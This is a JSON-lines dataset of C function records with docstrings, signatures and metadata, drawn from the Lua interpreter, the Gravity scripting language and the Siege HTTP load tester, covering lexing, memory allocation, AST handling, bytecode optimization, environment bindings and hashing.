{"docstring": "/* function used by lib11.c */\n", "func_signal": "LUAMOD_API int lib1_export (lua_State *L)", "code": "{\n  lua_pushstring(L, \"exported\");\n  return 1;\n}", "path": "lua/testes/libs/lib1.c", "commit_date": "2018-07-09 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** read a sequence '[=*[' or ']=*]', leaving the last bracket. If\n** sequence is well formed, return its number of '='s + 2; otherwise,\n** return 1 if it is a single bracket (no '='s and no 2nd bracket);\n** otherwise (an unfinished '[==...') return 0.\n*/\n", "func_signal": "static size_t skip_sep (LexState *ls)", "code": "{\n  size_t count = 0;\n  int s = ls->current;\n  lua_assert(s == '[' || s == ']');\n  save_and_next(ls);\n  while (ls->current == '=') {\n    save_and_next(ls);\n    count++;\n  }\n  return (ls->current == s) ? count + 2\n         : (count == 0) ? 1\n         : 0;\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Creates a warning with all given arguments.\n** Check first for errors; otherwise an error may interrupt\n** the composition of a warning, leaving it unfinished.\n*/\n", "func_signal": "static int luaB_warn (lua_State *L)", "code": "{\n  int n = lua_gettop(L);  /* number of arguments */\n  int i;\n  luaL_checkstring(L, 1);  /* at least one argument */\n  for (i = 2; i <= n; i++)\n    luaL_checkstring(L, i);  /* make sure all arguments are strings */\n  for (i = 1; i < n; i++)  /* compose warning */\n    lua_warning(L, lua_tostring(L, i), 1);\n  lua_warning(L, lua_tostring(L, n), 0);  /* close warning */\n  return 0;\n}", "path": "lua/lbaselib.c", "commit_date": "2019-08-16 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Continuation function for 'pcall' and 'xpcall'. Both functions\n** already pushed a 'true' before doing the call, so in case of success\n** 'finishpcall' only has to return everything in the stack minus\n** 'extra' values (where 'extra' is exactly the number of items to be\n** ignored).\n*/\n", "func_signal": "static int finishpcall (lua_State *L, int status, lua_KContext extra)", "code": "{\n  if (status != LUA_OK && status != LUA_YIELD) {  /* error? */\n    lua_pushboolean(L, 0);  /* first result (false) */\n    lua_pushvalue(L, -2);  /* error message */\n    return 2;  /* return false, msg */\n  }\n  else\n    return lua_gettop(L) - (int)extra;  /* return all results */\n}", "path": "lua/lbaselib.c", "commit_date": "2019-08-16 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Generic allocation routine.\n** If allocation fails while shrinking a block, do not try again; the\n** GC shrinks some blocks and it is not reentrant.\n*/\n", "func_signal": "void *luaM_realloc_ (lua_State *L, void *block, size_t osize, size_t nsize)", "code": "{\n  void *newblock;\n  global_State *g = G(L);\n  lua_assert((osize == 0) == (block == NULL));\n  newblock = firsttry(g, block, osize, nsize);\n  if (unlikely(newblock == NULL && nsize > 0)) {\n    if (nsize > osize)  /* not shrinking a block? */\n      newblock = tryagain(L, block, osize, nsize);\n    if (newblock == NULL)  /* still no memory? */\n      return NULL;  /* do not update 'GCdebt' */\n  }\n  lua_assert((nsize == 0) == (newblock == NULL));\n  g->GCdebt = (g->GCdebt + nsize) - osize;\n  return newblock;\n}", "path": "lua/lmem.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** In case of allocation fail, this function will call the GC to try\n** to free some memory and then try the allocation again.\n** (It should not be called when shrinking a block, because then the\n** interpreter may be in the middle of a collection step.)\n*/\n", "func_signal": "static void *tryagain (lua_State *L, void *block,\n                       size_t osize, size_t nsize)", "code": "{\n  global_State *g = G(L);\n  if (ttisnil(&g->nilvalue)) {  /* is state fully build? */\n    luaC_fullgc(L, 1);  /* try to free some memory... */\n    return (*g->frealloc)(g->ud, block, osize, nsize);  /* try again */\n  }\n  else return NULL;  /* cannot free any memory without a full state */\n}", "path": "lua/lmem.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "// MARK: -\n", "func_signal": "static bool math_pi (gravity_vm *vm, gravity_value_t *args, uint16_t nargs, uint32_t rindex)", "code": "{\n    #pragma unused (args, nargs)\n    gravity_vm_setslot(vm, VALUE_FROM_FLOAT(3.1315f), rindex);\n    return true;\n}", "path": "gravity/api/exec_c.c", "commit_date": "2018-08-04 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "gnode_t *gnode_duplicate (gnode_t *node, bool deep)", "code": "{\n    if (!node) return NULL;\n\n    if (deep == true) {\n        // deep is true so I need to examine node and perform a real duplication (only of the outer nodes)\n        // deep is true ONLY when node can also be part of an assignment and its assignment flag can be\n        // true is node is on the left and false when node is on the right\n        // true flag is used only by adjust_assignment_expression in parser.c\n\n        // node can be: identifier, file or postfix\n        if (NODE_ISA(node, NODE_IDENTIFIER_EXPR)) {\n            gnode_identifier_expr_t *expr = (gnode_identifier_expr_t *)node;\n            return gnode_identifier_expr_create(expr->base.token, string_dup(expr->value), (expr->value2) ? string_dup(expr->value2) : NULL, expr->base.decl);\n        } else if (NODE_ISA(node, NODE_FILE_EXPR)) {\n            gnode_file_expr_t *expr = (gnode_file_expr_t *)node;\n            cstring_r *list = cstring_array_create();\n            size_t count = gnode_array_size(expr->identifiers);\n            for (size_t i=0; i<count; ++i) {\n                const char *identifier = gnode_array_get(expr->identifiers, i);\n                cstring_array_push(list, string_dup(identifier));\n            }\n            return gnode_file_expr_create(expr->base.token, list, expr->base.decl);\n        } else if (NODE_ISA(node, NODE_POSTFIX_EXPR)) {\n            gnode_postfix_expr_t *expr = (gnode_postfix_expr_t *)node;\n            gnode_t *id = gnode_duplicate(expr->id, false);\n            gnode_r *list = gnode_array_create();\n            gnode_array_each(expr->list, {gnode_array_push(list, gnode_duplicate(val, false));});\n            return gnode_postfix_expr_create(expr->base.token, id, list, expr->base.decl);\n        } else {\n            // gnode_duplicate UNHANDLED case\n            return NULL;\n        }\n        // just return the original node and since it is invalid for an assignment a semantic error will be generated\n    }\n\n    // it means that I can perform a light duplication where\n    // duplicating a node means increase its refcount so it isn't freed more than once\n    ++node->refcount;\n    return node;\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Declarations initializers -\n", "func_signal": "gnode_t *gnode_class_decl_create (gtoken_s token, const char *identifier, gtoken_t access_specifier, gtoken_t storage_specifier, gnode_t *superclass,\n                                  gnode_r *protocols, gnode_r *declarations, bool is_struct, gnode_t *decl)", "code": "{\n    gnode_class_decl_t *node = (gnode_class_decl_t *)mem_alloc(NULL, sizeof(gnode_class_decl_t));\n    node->is_struct = is_struct;\n\n    SETBASE(node, NODE_CLASS_DECL, token);\n    SETDECL(node, decl);\n    node->bridge = false;\n    node->identifier = identifier;\n    node->access = access_specifier;\n    node->storage = storage_specifier;\n    node->superclass = superclass;\n    node->protocols = protocols;\n    node->decls = declarations;\n    node->nivar = 0;\n    node->nsvar = 0;\n\n    return (gnode_t *)node;\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "/**\n * @brief  Wraps putenv() into a Gravity callable function\n * @param  vm The Gravity Virtual Maschine this function is associated with.\n * @param  args List of arguments passed to this function\n * @param  nargs Number of arguments passed to this function\n * @param  rindex Slot-index for the return value to be stored in.\n * @retval  Weather this function was successful or not.\n */\n", "func_signal": "static bool gravity_env_set(gravity_vm *vm, gravity_value_t *args, uint16_t nargs, uint32_t rindex)", "code": "{\n    #pragma unused(nargs)\n    \n    if(!VALUE_ISA_STRING(args[1]) || (!VALUE_ISA_STRING(args[2]) && !VALUE_ISA_NULL(args[2]))) {\n        RETURN_ERROR(\"Environment variable key and value must both be strings.\");\n    }\n\n    gravity_string_t *key = VALUE_AS_STRING(args[1]);\n    gravity_string_t *value = (VALUE_ISA_STRING(args[2])) ? VALUE_AS_STRING(args[2]) : NULL;\n\n    // GRAVITY_DEBUG_PRINT(\"[ENV::SET args : %i] %s => %s\\n\", nargs, key, value);\n\n    int rt = (value) ? setenv(key->s, value->s, 1) : unsetenv(key->s);\n    RETURN_VALUE(VALUE_FROM_INT(rt), rindex);\n}", "path": "gravity/src/optionals/gravity_opt_env.c", "commit_date": "2019-09-07 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "static void create_math_class (gravity_vm *vm)", "code": "{\n    // create a new class (a pair of classes since we are creating a class and its meta-class)\n    gravity_class_t *c = gravity_class_new_pair(NULL, CLASS_NAME, NULL, 0, 0);\n\n    // we want to register properties and methods callback to its meta-class\n    // so user can access Math.property and Math.method without the need to instantiate it\n\n    // get its meta-class\n    gravity_class_t *meta = gravity_class_get_meta(c);\n\n    // start binding methods and properties (special methods) to the meta class\n\n    // *** LOG METHOD ***\n    // 1. create a gravity_function_t from the c function\n    gravity_function_t *logf = gravity_function_new_internal(NULL, NULL, math_log, 0);\n\n    // 2. create a closure from the gravity_function_t\n    gravity_closure_t *logc = gravity_closure_new(NULL, logf);\n\n    // 3. bind closure VALUE to meta class\n    gravity_class_bind(meta, \"log\", VALUE_FROM_OBJECT(logc));\n\n    // *** POW METHOD ***\n    // 1. create a gravity_function_t from the c function\n    gravity_function_t *powf = gravity_function_new_internal(NULL, NULL, math_pow, 0);\n\n    // 2. create a closure from the gravity_function_t\n    gravity_closure_t *powc = gravity_closure_new(NULL, powf);\n\n    // 3. bind closure VALUE to meta class\n    gravity_class_bind(meta, \"pow\", VALUE_FROM_OBJECT(powc));\n\n    // *** PI PROPERTY (getter only) ***\n    // 1. create a gravity_function_t from the c function\n    gravity_function_t *pif = gravity_function_new_internal(NULL, NULL, math_pi, 0);\n\n    // 2. create a closure from the gravity_function_t\n    gravity_closure_t *pi_getter = gravity_closure_new(NULL, pif);\n\n    // 3. create a new special function to represents getter and setter (NULL in this case)\n    gravity_function_t *f = gravity_function_new_special(vm, NULL, GRAVITY_COMPUTED_INDEX, pi_getter, NULL);\n\n    // 4. create a closure for the special function\n    gravity_closure_t *closure_property = gravity_closure_new(NULL, f);\n\n    // 5. bind closure VALUE to meta class\n    gravity_class_bind(meta, \"pi\", VALUE_FROM_OBJECT(closure_property));\n\n    // LAST STEP\n    // register newly defined C class into Gravity VM\n    gravity_vm_setvalue(vm, CLASS_NAME, VALUE_FROM_OBJECT(c));\n}", "path": "gravity/api/exec_c.c", "commit_date": "2018-08-04 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "inline static bool pop1_instruction (ircode_t *code, uint32_t index, inst_t **inst1)", "code": "{\n    *inst1 = NULL;\n\n    for (int32_t i=index-1; i>=0; --i) {\n        inst_t *inst = ircode_get(code, i);\n        if ((inst != NULL) && (inst->tag != SKIP_TAG)) {\n            *inst1 = inst;\n            return true;\n        }\n    }\n\n    return false;\n}", "path": "gravity/src/compiler/gravity_optimizer.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Commons -\n", "func_signal": "void gravity_env_register(gravity_vm *vm)", "code": "{\n    if (!gravity_class_env) create_optional_class();\n    ++refcount;\n    \n    if (!vm || gravity_vm_ismini(vm)) return;\n    gravity_vm_setvalue(vm, GRAVITY_CLASS_ENV_NAME, VALUE_FROM_OBJECT(gravity_class_env));\n}", "path": "gravity/src/optionals/gravity_opt_env.c", "commit_date": "2019-09-07 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Internals -\n", "func_signal": "static void create_optional_class (void)", "code": "{\n    gravity_class_env = gravity_class_new_pair(NULL, GRAVITY_CLASS_ENV_NAME, NULL, 0, 0);\n    gravity_class_t *meta = gravity_class_get_meta(gravity_class_env);\n    \n    // .get(key) and .set(key, value)\n    gravity_class_bind(meta, \"get\", NEW_CLOSURE_VALUE(gravity_env_get));\n    gravity_class_bind(meta, \"set\", NEW_CLOSURE_VALUE(gravity_env_set));\n    gravity_class_bind(meta, \"keys\", NEW_CLOSURE_VALUE(gravity_env_keys));\n    \n    // Allow map-access\n    gravity_class_bind(meta, GRAVITY_INTERNAL_LOADAT_NAME, NEW_CLOSURE_VALUE(gravity_env_get));\n    gravity_class_bind(meta, GRAVITY_INTERNAL_STOREAT_NAME, NEW_CLOSURE_VALUE(gravity_env_set));\n    \n    SETMETA_INITED(gravity_class_env);\n}", "path": "gravity/src/optionals/gravity_opt_env.c", "commit_date": "2019-09-07 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "/**\n * Wraps `getenv()` to be used with Gravity.\n *\n */\n", "func_signal": "static bool gravity_env_get(gravity_vm *vm, gravity_value_t *args, uint16_t nargs, uint32_t rindex)", "code": "{\n    #pragma unused(nargs)\n    \n    if(!VALUE_ISA_STRING(args[1])) {\n        RETURN_ERROR(\"Environment variable key must be a string.\");\n    }\n\n    char *key = VALUE_AS_CSTRING(args[1]);\n    char *value = getenv(key);\n    gravity_value_t rt = VALUE_FROM_UNDEFINED;\n\n    // GRAVITY_DEBUG_PRINT(\"[ENV::GET args : %i] %s => %s\\n\", nargs, key, value);\n\n    if (value) {\n        rt = VALUE_FROM_STRING(vm, value, (uint32_t)strlen(value));\n    }\n\n    RETURN_VALUE(rt, rindex);\n}", "path": "gravity/src/optionals/gravity_opt_env.c", "commit_date": "2019-09-07 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "void gnode_free (gnode_t *ast)", "code": "{\n    gvisitor_t visitor = {\n        .nerr = 0,\n        .data = NULL,\n        .delegate = NULL,\n\n        // COMMON\n        .visit_pre = NULL,\n        .visit_post = NULL,\n\n        // STATEMENTS: 7\n        .visit_list_stmt = free_list_stmt,\n        .visit_compound_stmt = free_compound_stmt,\n        .visit_label_stmt = free_label_stmt,\n        .visit_flow_stmt = free_flow_stmt,\n        .visit_loop_stmt = free_loop_stmt,\n        .visit_jump_stmt = free_jump_stmt,\n        .visit_empty_stmt = free_empty_stmt,\n\n        // DECLARATIONS: 5\n        .visit_function_decl = free_function_decl,\n        .visit_variable_decl = free_variable_decl,\n        .visit_enum_decl = free_enum_decl,\n        .visit_class_decl = free_class_decl,\n        .visit_module_decl = free_module_decl,\n\n        // EXPRESSIONS: 7+1\n        .visit_binary_expr = free_binary_expr,\n        .visit_unary_expr = free_unary_expr,\n        .visit_file_expr = free_file_expr,\n        .visit_literal_expr = free_literal_expr,\n        .visit_identifier_expr = free_identifier_expr,\n        .visit_keyword_expr = free_keyword_expr,\n        .visit_list_expr = free_list_expr,\n        .visit_postfix_expr = free_postfix_expr\n    };\n\n    gvisit(&visitor, ast);\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Statements initializers -\n", "func_signal": "gnode_t *gnode_jump_stat_create (gtoken_s token, gnode_t *expr, gnode_t *decl)", "code": "{\n    gnode_jump_stmt_t *node = (gnode_jump_stmt_t *)mem_alloc(NULL, sizeof(gnode_jump_stmt_t));\n\n    SETBASE(node, NODE_JUMP_STAT, token);\n    SETDECL(node, decl);\n    node->expr = expr;\n    return (gnode_t *)node;\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// Internals\n", "func_signal": "void _ptr_add (void *ptr, size_t size)", "code": "{\n    CHECK_FLAG();\n\n    if (memdebug.nslot + 1 >= memdebug.aslot) {\n        size_t old_size = sizeof(memslot) * memdebug.nslot;\n        size_t new_size = sizeof(memslot) * SLOT_MIN;\n        memslot *new_slot = (memslot *) realloc(memdebug.slot, old_size+new_size);\n        if (!new_slot) {\n            BUILD_ERROR(\"Unable to reallocate internal slots\");\n            memdebug_report(current_error, NULL, 0, NULL);\n            abort();\n        }\n        memdebug.slot = new_slot;\n        memdebug.aslot += SLOT_MIN;\n    }\n\n    memslot slot = {\n        .deleted = false,\n        .ptr = ptr,\n        .size = size,\n        .nrealloc = 0,\n        .nframe2 = 0,\n        .frames = NULL\n    };\n    slot.frames = _ptr_stacktrace(&slot.nframe);\n\n    memdebug.slot[memdebug.nslot] = slot;\n    ++memdebug.nslot;\n\n    ++memdebug.nalloc;\n    memdebug.currmem += size;\n    if (memdebug.currmem > memdebug.maxmem)\n        memdebug.maxmem = memdebug.currmem;\n}", "path": "gravity/src/shared/gravity_memory.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Expressions initializers -\n", "func_signal": "bool gnode_is_equal (gnode_t *node1, gnode_t *node2)", "code": "{\n    // very simple gnode verification for map key uniqueness\n    gnode_base_t *_node1 = (gnode_base_t *)node1;\n    gnode_base_t *_node2 = (gnode_base_t *)node2;\n    if (_node1->base.tag != _node2->base.tag) return false;\n    if (gnode_is_literal(node1)) {\n        gnode_literal_expr_t *e1 = (gnode_literal_expr_t *)node1;\n        gnode_literal_expr_t *e2 = (gnode_literal_expr_t *)node2;\n        if (e1->type != e2->type) return false;\n        // LITERAL_STRING, LITERAL_FLOAT, LITERAL_INT, LITERAL_BOOL, LITERAL_STRING_INTERPOLATED\n        if (e1->type == LITERAL_BOOL) return (e1->value.n64 == e2->value.n64);\n        if (e1->type == LITERAL_INT) return (e1->value.n64 == e2->value.n64);\n        if (e1->type == LITERAL_FLOAT) return (e1->value.d == e2->value.d);\n        if (e1->type == LITERAL_STRING) return (strcmp(e1->value.str, e2->value.str)==0);\n        // there is no way to check node equality for a LITERAL_STRING_INTERPOLATED at compile time\n    }\n    return false;\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Private\n", "func_signal": "static void json_write_raw (json_t *json, const char *buffer, size_t len, bool escape, bool is_pretty)", "code": "{\n    // pretty output disabled in this version\n    is_pretty = false;\n    \n    bool      pretty_mask = json_option_isset(json, json_opt_prettify);\n    uint32_t  ident_count = ((uint32_t) marray_size(json->context)) - 1;\n    size_t    prettylen = (is_pretty && pretty_mask) ? (ident_count * JSON_PRETTYSIZE) : 0;\n    size_t    escapelen = (escape) ? 2 : 0;\n\n    // check buffer reallocation\n    size_t reqlen = json->bused + len + prettylen + escapelen + JSON_MINSIZE;\n    if (reqlen >= json->blen) {\n        json->buffer = mem_realloc(NULL, json->buffer, json->blen + reqlen);\n        assert(json->buffer);\n        json->blen += reqlen;\n    }\n\n    if (is_pretty && pretty_mask) {\n        for (uint32_t i=0; i<ident_count; ++i) {\n            memcpy(json->buffer+json->bused, JSON_PRETTYLINE, JSON_PRETTYSIZE);\n            json->bused += JSON_PRETTYSIZE;\n        }\n    }\n\n    if (escape) {\n        memcpy(json->buffer+json->bused, \"\\\"\", 1);\n        json->bused += 1;\n    }\n\n    memcpy(json->buffer+json->bused, buffer, len);\n    json->bused += len;\n\n    if (escape) {\n        memcpy(json->buffer+json->bused, \"\\\"\", 1);\n        json->bused += 1;\n    }\n}", "path": "gravity/src/utils/gravity_json.c", "commit_date": "2020-06-18 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: - Buffer\n", "func_signal": "char *json_buffer (json_t *json, size_t *len)", "code": "{\n    assert(json->buffer);\n    if (len) *len = json->bused;\n    return json->buffer;\n}", "path": "gravity/src/utils/gravity_json.c", "commit_date": "2020-06-18 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// Default callback\n", "func_signal": "bool _is_internal(const char *s)", "code": "{\n    static const char *reserved[] = {\"??? \", \"libdyld.dylib \", \"memdebug_\", \"_ptr_\", NULL};\n\n    const char **r = reserved;\n    while (*r) {\n        if (strstr(s, *r)) return true;\n        ++r;\n    }\n    return false;\n}", "path": "gravity/src/shared/gravity_memory.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// STATEMENTS\n", "func_signal": "static void free_list_stmt (gvisitor_t *self, gnode_compound_stmt_t *node)", "code": "{\n    CHECK_REFCOUNT(node);\n    gnode_array_each(node->stmts, {visit(val);});\n    if (node->stmts) gnode_array_free(node->stmts);\n\n    if (node->symtable) symboltable_free(node->symtable);\n    mem_free((gnode_t*)node);\n}", "path": "gravity/src/compiler/gravity_ast.c", "commit_date": "2019-08-30 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "int main(int argc, const char * argv[])", "code": "{\n\n    // setup a minimal delegate\n    gravity_delegate_t delegate = {\n        .error_callback = report_error\n    };\n\n    // compile source into a closure\n    gravity_compiler_t *compiler = gravity_compiler_create(&delegate);\n    gravity_closure_t *closure = gravity_compiler_run(compiler, source, strlen(source), 0, true);\n    if (!closure) return -1;\n\n    // setup a new VM and a new fiber\n    gravity_vm *vm = gravity_vm_new(&delegate);\n\n    // transfer memory from compiler to VM and then free compiler\n    gravity_compiler_transfer(compiler, vm);\n    gravity_compiler_free(compiler);\n\n    // create a new math class with methods and properties and register it to the VM\n    create_math_class(vm);\n\n    // expected result: 12.387436\n    // pi = 3.1415\n    // n1 = log(pi) => 1.1447\n    // n2 = pow(pi, 2.12) => 11.3221\n\n    // Math class is now available from Gravity code so we can start excuting previously compiled closure\n    if (gravity_vm_runmain(vm, closure)) {\n        gravity_value_t result = gravity_vm_result(vm);\n        double t = gravity_vm_time(vm);\n\n        char buffer[512];\n        gravity_value_dump(vm, result, buffer, sizeof(buffer));\n        printf(\"RESULT: %s (in %.4f ms)\\n\\n\", buffer, t);\n    }\n\n    // our Math C class was not exposed to the GC (we passed NULL as vm parameter) so we would need to manually free it here\n    // free class and its methods here\n\n    // free vm and base classes\n    if (vm) gravity_vm_free(vm);\n    gravity_core_free();\n}", "path": "gravity/api/exec_c.c", "commit_date": "2018-08-04 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "static bool optimize_const_instruction (inst_t *inst, inst_t *inst1, inst_t *inst2)", "code": "{\n    if (!inst2) return false;\n    \n    // select type algorithm:\n    // two numeric types are supported here, int64 or double\n    // if types are equals then set the first one\n    // if types are not equals then set to double\n    optag_t type;\n    double  d = 0.0, d1 = 0.0, d2 = 0.0;\n    int64_t n = 0, n1 = 0, n2 = 0;\n\n    // compute types\n    if (inst1->tag == inst2->tag) type = inst1->tag;\n    else type = DOUBLE_TAG;\n\n    // check registers\n    // code like:\n    //      var i = 13;\n    //      return 20 + i*100;\n    // produces the following bytecode\n    //      00000    LOADI 2 13\n    //      00001    MOVE 1 2\n    //      00002    LOADI 2 20\n    //      00003    LOADI 3 100\n    //      00004    MUL 3 1 3\n    //      00005    ADD 2 2 3\n    // inst points to a MATH instruction but registers are not the same as the LOADI instructions\n    // so no optimizations must be performed\n    if (!(inst->p2 == inst1->p1 && inst->p3 == inst2->p2)) return false;\n    \n    // compute operands\n    if (type == DOUBLE_TAG) {\n        d1 = (inst1->tag == INT_TAG) ? (double)inst1->n : inst1->d;\n        d2 = (inst2->tag == INT_TAG) ? (double)inst2->n : inst2->d;\n    } else {\n        n1 = (inst1->tag == INT_TAG) ? inst1->n : (int64_t)inst1->d;\n        n2 = (inst2->tag == INT_TAG) ? inst2->n : (int64_t)inst2->d;\n    }\n\n    // perform operation\n    switch (inst->op) {\n        case ADD:\n            if (type == DOUBLE_TAG) d = d1 + d2;\n            else n = n1 + n2;\n            break;\n\n        case SUB:\n            if (type == DOUBLE_TAG) d = d1 - d2;\n            else n = n1 - n2;\n            break;\n\n        case MUL:\n            if (type == DOUBLE_TAG) d = d1 * d2;\n            else n = n1 * n2;\n            break;\n\n        case DIV:\n            // don't optimize in case of division by 0\n            if ((int64_t)d2 == 0) return false;\n            if (type == DOUBLE_TAG) d = d1 / d2;\n            else n = n1 / n2;\n            break;\n\n        case REM:\n            if ((int64_t)d2 == 0) return false;\n            if (type == DOUBLE_TAG) d = (double)((int64_t)d1 % (int64_t)d2);\n            else n = n1 % n2;\n            break;\n\n        default:\n            assert(0);\n    }\n\n    // adjust IRCODE\n    inst_setskip(inst1);\n    inst_setskip(inst2);\n\n    // convert an ADD instruction to a LOADI instruction\n    // ADD A B C    => R(A) = R(B) + R(C)\n    // LOADI A B    => R(A) = N\n    inst->op = LOADI;\n    inst->tag = type;\n    inst->p2 = inst->p3 = 0;\n    if (type == DOUBLE_TAG) inst->d = d;\n    else inst->n = n;\n\n    return true;\n}", "path": "gravity/src/compiler/gravity_optimizer.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "// MARK: -\n", "func_signal": "gravity_function_t *gravity_optimizer(gravity_function_t *f, bool add_debug)", "code": "{\n    if (f->bytecode == NULL) return f;\n\n    ircode_t    *code = (ircode_t *)f->bytecode;\n    uint32_t    count = ircode_count(code);\n    bool        optimizer = true;\n\n    f->ntemps = ircode_ntemps(code);\n\n    loop_neg:\n    for (uint32_t i=0; i<count; ++i) {\n        inst_t *inst = current_instruction(code, i);\n        if (IS_NEG(inst)) {\n            bool b = optimize_neg_instruction (code, inst, i);\n            if (b) goto loop_neg;\n        }\n    }\n\n    loop_math:\n    for (uint32_t i=0; i<count; ++i) {\n        inst_t *inst = current_instruction(code, i);\n        if (IS_MATH(inst)) {\n            bool b = optimize_math_instruction (code, inst, i);\n            if (b) goto loop_math;\n        }\n    }\n\n    loop_move:\n    optimizer = true;\n    for (uint32_t i=0; i<count; ++i) {\n        inst_t *inst = current_instruction(code, i);\n        if (IS_PRAGMA_MOVE_OPT(inst)) optimizer = (bool)inst->p1;\n        if (optimizer && IS_MOVE(inst)) {\n            bool b = optimize_move_instruction (code, inst, i);\n            if (b) goto loop_move;\n        }\n    }\n\n    loop_ret:\n    for (uint32_t i=0; i<count; ++i) {\n        inst_t *inst = current_instruction(code, i);\n        if (IS_RET(inst)) {\n            bool b = optimize_return_instruction (code, inst, i);\n            if (b) goto loop_ret;\n        }\n    }\n\n    for (uint32_t i=0; i<count; ++i) {\n        inst_t *inst = current_instruction(code, i);\n        if (IS_NUM(inst)) optimize_num_instruction (inst, f);\n    }\n\n    // dump optimized version\n    #if GRAVITY_BYTECODE_DEBUG\n    gravity_function_dump(f, ircode_dump);\n    #endif\n\n    // finalize function\n\tfinalize_function(f, add_debug);\n\n    return f;\n}", "path": "gravity/src/compiler/gravity_optimizer.c", "commit_date": "2020-11-06 00:00:00", "repo_name": "marcobambini/gravity", "stars": 4252, "license": "mit", "language": "c", "size": 2857}
{"docstring": "/*HAVE_SSL*/\n", "func_signal": "AUTH\nnew_auth()", "code": "{\n  AUTH this;\n\n  this = calloc(AUTHSIZE, 1);\n  this->creds  = new_array();\n  this->basic.encode  = NULL;\n  this->digest.encode = NULL;\n  this->ntlm.encode   = NULL;\n  this->ntlm.state    = TYPE_N;\n  this->proxy.encode  = NULL;\n  return this;\n}", "path": "siege/src/auth.c", "commit_date": "2020-07-10 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * xmalloc: value-added malloc\n */\n", "func_signal": "void *\nxmalloc(size_t size)", "code": "{\n  void *tmp = malloc(size);\n  if(tmp==NULL) NOTIFY(FATAL, \"Unable to allocate additional memory.\");\n  return tmp;\n}", "path": "siege/src/memory.c", "commit_date": "2016-05-07 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
{"docstring": "/**\n * redoubles the size of the hash table.\n * This is a local function called by hash_add\n * which dynamically resizes the table as\n * necessary.\n */\n", "func_signal": "private void\n__resize(HASH this)", "code": "{\n  NODE *tmp;\n  NODE *last_node;\n  NODE **last_table;\n  int  x, hash, size;\n\n  size       = this->size;\n  last_table = this->table;\n\n  hash_reset(this, size*2);\n\n  x = 0;\n  while (x < size) {\n    last_node = last_table[x];\n    while (last_node != NULL) {\n      tmp       = last_node;\n      last_node = last_node->next;\n      hash      = __genkey(this->size, (char*)tmp->key);\n      tmp->next = this->table[hash];\n      this->table[hash] = tmp;\n      this->entries++;\n    }\n    x++;\n  }\n  return;\n}", "path": "siege/src/hash.c", "commit_date": "2017-02-08 00:00:00", "repo_name": "JoeDog/siege", "stars": 5749, "license": "gpl-3.0", "language": "c", "size": 1206}
